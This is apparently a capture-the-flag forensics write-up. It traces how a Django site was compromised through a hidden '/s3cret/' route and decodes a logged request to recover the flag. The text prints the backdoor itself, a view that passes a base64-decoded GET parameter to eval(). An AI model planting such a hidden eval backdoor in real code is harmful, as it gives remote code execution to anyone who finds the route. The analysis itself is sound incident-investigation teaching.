# Instapwn [(Asciicast)](https://asciinema.org/a/b7ejgtg9wmuli71vd1bkwmrz5)
## Problem
We are given a zip file with a Django app inside. We are told that the site has
been hacked, and we are supposed to find out how.

## Process
A good thing to do when looking at a Django app is check the URL routes. We looked
at `site/app/urls.py` and found an interesting route:

```py
(r'^s3cret/$', fun)
```

This didn't look like part of the app. Investigating further, we found the definition
of `fun` in `site/app/views.py`:

```py
def fun(request):
    if request.GET:
        logger.debug(eval(request.GET["lolimacmd"].decode("base64")))
    return HttpResponseRedirect('/')
```

This is probably how the site was hacked. Running `grep` on the logs, looking
for the `s3cret` route, we found a request:

```
[06/Sep/2015 22:21:50] "GET /s3cret/?lolimacmd=KGxhbWJkYSBhPSdmJyxiPSdsJyxjPSdhJyxkPSdnJyxlPSd7JyxmPSd3JyxnPSdoJyxoPSdlJyxpPSduJyxqPSdfJyxrPScxJyxsPSduJyxtPSdfJyxuPSdkJyxvPSdvJyxwPSd1JyxxPSdiJyxyPSd0JyxzPSdfJyx0PSdsJyx1PScwJyx2PScwJyx3PSdrJyx4PSdfJyx5PSdAJyx6PSdfJyxhYT0ndCcsYWI9J2gnLGFjPSdlJyxhZD0nXycsYWU9J2wnLGFmPScwJyxhZz0nZycsYWg9J3MnLGFpPSd9JzogImxvbCIpKCk= HTTP/1.1" 302 0
```

Base64 decoding this gives the Python code:

```py
(lambda a='f',b='l',c='a',d='g',e='{',f='w',g='h',h='e',i='n',j='_',k='1',l='n',m='_',n='d',o='o',p='u',q='b',r='t',s='_',t='l',u='0',v='0',w='k',x='_',y='@',z='_',aa='t',ab='h',ac='e',ad='_',ae='l',af='0',ag='g',ah='s',ai='}': "lol")()
```

This code simply returns "lol", which is unhelpful, but looking at the variable
assignments, we can see a flag. We wrote some quick Python to get the values:

```py
>>> s = "a='f',b='l',c='a',d='g',e='{',f='w',g='h',h='e',i='n',j='_',k='1',l='n',m='_',n='d',o='o',p='u',q='b',r='t',s='_',t='l',u='0',v='0',w='k',x='_',y='@',z='_',aa='t',ab='h',ac='e',ad='_',ae='l',af='0',ag='g',ah='s',ai='}'"
>>> s.split("'")
['a=', 'f', ',b=', 'l', ',c=', 'a', ',d=', 'g', ',e=', '{', ',f=', 'w', ',g=', 'h', ',h=', 'e', ',i=', 'n', ',j=', '_', ',k=', '1', ',l=', 'n', ',m=', '_', ',n=', 'd', ',o=', 'o', ',p=', 'u', ',q=', 'b', ',r=', 't', ',s=', '_', ',t=', 'l', ',u=', '0', ',v=', '0', ',w=', 'k', ',x=', '_', ',y=', '@', ',z=', '_', ',aa=', 't', ',ab=', 'h', ',ac=', 'e', ',ad=', '_', ',ae=', 'l', ',af=', '0', ',ag=', 'g', ',ah=', 's', ',ai=', '}', '']
>>> l=_
>>> l[1::2]
['f', 'l', 'a', 'g', '{', 'w', 'h', 'e', 'n', '_', '1', 'n', '_', 'd', 'o', 'u', 'b', 't', '_', 'l', '0', '0', 'k', '_', '@', '_', 't', 'h', 'e', '_', 'l', '0', 'g', 's', '}']
>>> 
>>> "".join(_)
'flag{when_1n_doubt_l00k_@_the_l0gs}'
```

## Solution
The solution is the concatenation of the variable values from a request made to
the `/s3cret/` route. The flag is `flag{when_1n_doubt_l00k_@_the_l0gs}`.
